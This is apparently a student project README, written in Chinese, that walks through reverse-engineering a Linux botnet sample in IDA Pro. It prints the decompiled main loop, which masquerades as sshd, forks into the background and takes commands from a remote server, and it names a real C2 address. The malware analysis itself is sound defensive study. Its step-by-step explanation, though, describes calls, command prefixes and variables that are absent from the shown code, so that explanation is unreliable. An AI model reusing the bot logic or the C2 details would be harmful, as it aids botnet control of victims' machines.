# COMPUTER-PROJECT-DESIGN
COMPUTER PROJECT DESIGN

# 簡介
IDA Pro 是一款功能強大的反組譯器和除錯器，廣泛用於軟體逆向工程。它不僅是專業逆向工程師的首選工具，還被許多安全研究人員和惡意軟體分析師所青睞。以下是對 IDA Pro 主要功能的詳細介紹：
* **多平台支持：** IDA Pro 支持多種操作系統，包括 Windows、macOS 和 Linux。此外，它還能分析多種不同的二進制檔案格式，如 PE、ELF 和 Mach-O。
* **高度互動的使用者介面：** 使用者可以輕鬆地在圖形和文字模式之間切換，並使用豐富的視覺化工具來分析複雜的二進制檔案。

# 使用步驟
* 將要分析的ELF檔用IDA Pro開啟會看到如下圖的架構圖

![Image text](https://github.com/Potassium-chromate/COMPUTER-PROJECT-DESIGN/blob/main/picture/%E6%9E%B6%E6%A7%8B%E5%9C%96.png)
* 細看能發現上面佈滿密密麻麻的組合語言
  
![Image text](https://github.com/Potassium-chromate/COMPUTER-PROJECT-DESIGN/blob/main/picture/%E6%9E%B6%E6%A7%8B%E5%9C%96_%E7%B4%B0%E7%AF%80.png)
* 按下F5後IDA Pro會自動反編譯成pseudocode 

![Image text](https://github.com/Potassium-chromate/COMPUTER-PROJECT-DESIGN/blob/main/picture/%E5%8F%8D%E7%B7%A8%E8%AD%AF%E8%99%9B%E6%93%AC%E7%A2%BC.png)

* 反編譯後的pseudocode 如下
```
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // edx
  int v4; // ecx
  int v5; // r8d
  int v6; // r9d
  int v7; // ebx
  unsigned int v8; // eax
  int v9; // ebx
  unsigned int v10; // eax
  int v11; // ecx
  int v12; // r8d
  int v13; // r9d
  int v14; // ebx
  char v15; // [rsp+0h] [rbp-1120h]
  char v16[4096]; // [rsp+50h] [rbp-10D0h] BYREF
  __int64 v17[10]; // [rsp+1050h] [rbp-D0h] BYREF
  int v18; // [rsp+10A0h] [rbp-80h] BYREF
  char v19[4]; // [rsp+10A4h] [rbp-7Ch] BYREF
  const char *v20; // [rsp+10A8h] [rbp-78h]
  unsigned int v21; // [rsp+10B0h] [rbp-70h]
  __int64 v23; // [rsp+10B8h] [rbp-68h]
  int v24; // [rsp+10C0h] [rbp-60h]
  int i; // [rsp+10C4h] [rbp-5Ch]
  char *v26; // [rsp+10C8h] [rbp-58h]
  __int64 v27; // [rsp+10D0h] [rbp-50h]
  unsigned int j; // [rsp+10DCh] [rbp-44h]
  const char *k; // [rsp+10E0h] [rbp-40h]
  char *v30; // [rsp+10E8h] [rbp-38h]
  char *m; // [rsp+10F0h] [rbp-30h]
  int v32; // [rsp+10FCh] [rbp-24h]
  const char *v33; // [rsp+1100h] [rbp-20h]
  int n; // [rsp+110Ch] [rbp-14h]

  v20 = (const char *)&unk_412725;
  if ( (unsigned int)access("/usr/bin/python", 0LL, envp) == -1 )
    v20 = "/usr/sbin/dropbear";
  else
    v20 = "sshd";
  if ( !(unsigned int)geteuid() )
    userID = 0;
  strncpy(*argv, &unk_412725, strlen(*argv));
  sprintf((unsigned int)*argv, (_DWORD)v20, v3, v4, v5, v6);
  prctl(15LL, v20, 0LL, 0LL, 0LL);
  v7 = time(0LL);
  v8 = getpid();
  srandom(v7 ^ v8);
  v9 = time(0LL);
  v10 = getpid();
  init_rand(v9 ^ v10);
  getOurIP();
  table_init();
  v18 = 0;
  table_unlock_val(1LL);
  v23 = table_retrieve_val(1LL, &v18);
  write(1LL, v23, v18);
  write(1LL, "\n", 1LL);
  table_lock_val(1LL);
  watchdog_maintain();
  v21 = fork();
  if ( v21 )
  {
    waitpid(v21, v19, 0LL);
    exit(0);
  }
  if ( (unsigned int)fork() )
    exit(0);
  signal(13, 1LL);
  while ( 1 )
  {
    while ( (unsigned int)initConnection() )
      sleep(5LL);
    getBuild();
    sockprintf(KHcommSOCK, (unsigned int)"arch %s", (unsigned int)"x86", v11, v12, v13, v15);
    v24 = 0;
    i = 0;
    while ( 1 )
    {
      v24 = recvLine((unsigned int)KHcommSOCK, v16, 4096LL);
      if ( v24 == -1 )
        break;
      for ( i = 0; i < (unsigned __int64)numpids; ++i )
      {
        if ( (int)waitpid(*(unsigned int *)(4LL * i + pids), 0LL, 1LL) > 0 )
        {
          for ( j = i + 1; j < (unsigned __int64)numpids; ++j )
            *(_DWORD *)(4LL * (j - 1) + pids) = *(_DWORD *)(4LL * j + pids);
          *(_DWORD *)(4LL * (j - 1) + pids) = 0;
          --numpids;
          v27 = malloc(4 * numpids + 4);
          for ( j = 0; j < (unsigned __int64)numpids; ++j )
            *(_DWORD *)(v27 + 4LL * j) = *(_DWORD *)(4LL * j + pids);
          free(pids);
          pids = v27;
        }
      }
      v16[v24] = 0;
      trim(v16);
      v26 = v16;
      if ( v16[0] == 46 )
      {
        for ( k = v26 + 1; *k != 32 && *k; ++k )
          ;
        if ( *k )
        {
          *k = 0;
          k = v26 + 1;
          for ( v26 += strlen(v26 + 1) + 2;
                v26[strlen(v26) - 1] == 10 || v26[strlen(v26) - 1] == 13;
                v26[strlen(v26) - 1] = 0 )
          {
            ;
          }
          v30 = v26;
          while ( *v26 != 32 && *v26 )
            ++v26;
          *v26++ = 0;
          for ( m = v30; *m; ++m )
            *m = toupper((unsigned __int8)*m);
          v32 = 1;
          v33 = (const char *)strtok(v26, " ");
          v17[0] = (__int64)v30;
          while ( v33 )
          {
            if ( *v33 != 10 )
            {
              v14 = v32;
              v17[v14] = malloc(strlen(v33) + 1);
              memset((void *)v17[v32], 0, strlen(v33) + 1);
              strcpy(v17[v32++], v33);
            }
            v33 = (const char *)strtok(0LL, " ");
          }
          processCmd((unsigned int)v32, v17);
          if ( v32 > 1 )
          {
            for ( n = 1; n < v32; ++n )
              free(v17[n]);
          }
        }
      }
    }
  }
}
```

# 分析
從上述的 pseudocode 可以看出該惡意程式的運作大致能分為以下步驟
1. **初始化：**
  * 該程序修改命令行參數 `*argv` 以指向內存地址 ( &unk_40F17D)。
  * 然後它調用`prctl`來設置calling process的名稱。這可能是試圖掩蓋其在process list中的存在。
2. **隨機種子生成：**
  * `srandom`該程序使用從當前時間和進程 ID 派生的值作為隨機數生成器 ( ) 的種子。這可能用於稍後在程序中生成隨機值。
3. **進程分叉：**
  * 該程序分叉兩次。這是守護進程用來將自身與終端分離並在後台運行的常用技術。父進程退出，子進程繼續運行。
4. **設置環境：**
  * 程序將其工作目錄更改為根目錄 `chdir("/")`。
  * `setuid(0)`它嘗試通過將其用戶 ID 設置為 root來提升其權限。
  * 它為信號設置一個信號處理程序`SIGPIPE`以忽略它。這可以防止程序在寫入另一端已關閉的套接字時終止。
5. **主程式 :**
  * 程序進入一個循環，不斷分叉。子進程嘗試初始化連接 `initConnection()`。如果成功，它會檢索系統信息，例如字節序和構建類型(`getEndianness()`和`getBuild()`)，並將該信息發送到遠程服務器。
  * 然後程序進入另一個循環，等待來自遠程服務器的命令。這些命令被讀入`v13`緩衝區。
  * 如果收到命令，它會檢查特定字符串，例如“ICMP”和“DUP”。如果收到“DUP”，則程序終止，這可能是來自服務器的終止命令。
  * 如果命令以感嘆號 ( !) 開頭，則會標記該命令並使用 對其進行處理`processCmd()`。這表明該惡意軟件支持遠程服務器可以發出的一系列命令。
6. **命令處理：**
  * 程序將接收到的命令標記化並對其進行處理。從所提供的代碼中尚不清楚這些命令的確切性質，但它們可能是機器人可以執行的惡意操作。
7. **清理 : **
  * 如果與服務器的連接丟失或發生錯誤，子進程會休眠 5 秒，然後嘗試重新連接。

# 細節分析
對著原本 pseudocode 中的`initConnection()`點兩下，即可看到該子程式的 pseudocode 

![Image text](https://github.com/Potassium-chromate/COMPUTER-PROJECT-DESIGN/blob/main/picture/initConnection_%E7%B4%B0%E7%AF%80.png)
此時可一窺其運作細節，此時可看到其中有個名為commServer的可疑數組

![Image text](https://github.com/Potassium-chromate/COMPUTER-PROJECT-DESIGN/blob/main/picture/commServer_%E7%B4%B0%E7%AF%80.png)

可以發現攻擊者的ip是 `45.56.96.91:23`





